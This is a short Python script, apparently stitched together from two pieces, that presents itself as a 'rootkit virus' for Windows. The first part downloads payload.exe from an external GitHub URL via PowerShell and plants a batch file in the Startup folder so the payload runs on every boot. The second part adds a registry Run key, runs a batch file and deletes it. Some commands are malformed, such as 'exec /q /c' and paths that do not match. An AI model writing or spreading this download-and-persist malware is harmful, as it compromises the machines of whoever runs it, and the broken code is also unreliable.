import os 
# creating a directory 
if not os.path.exists("rootkit"): 
    os.makedirs("rootkit") 
  
# Change the current working Directory    
os.chdir("rootkit")  
  
#creating a rootkit configuration file
f = open("config.ini","w+") 
f.write( "process_name=svchost \nsvc_name=Alerter\nhide_folder = %AppData%\nservice_type = stealth \ntrigger = 0 \ninstaller = %Desktop%\nstartup = 0" ) 
f.close() 
  
#downloading payload
os.system("powershell -command\\(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MKR-Kamal/virus/master/payload.exe','payload.exe')")

#creating a batch file to execute The Payload at startup
batch = open("run.bat","w+") 
batch.write("@echo off \ncd C:/rootkit/ \nexec /q /c payload.exe") 
batch.close() 
  
#adding The Run.bat File In Startup Folder To Execute Payload on startup
os.system("copy run.bat C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")



#First we will import the necessary libraries to create a Rookit virus 
import os 
import subprocess 

#Next, let's set up our malicious code 
malicious_code = '''@echo off 
:start 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v my_program /t REG_SZ /d %systemroot%\system32\calc.exe 
start calc.exe
'''

#Now, let's save the malicious code in a file called "my_rookit.bat" 
with open("my_rookit.bat", "w") as f: 
    f.write(malicious_code) 

#Let's run the created batch file 
subprocess.call("start my_rookit.bat", shell = True) 

#Finally, let's delete the file after it has been executed 
os.remove("my_rookit.bat")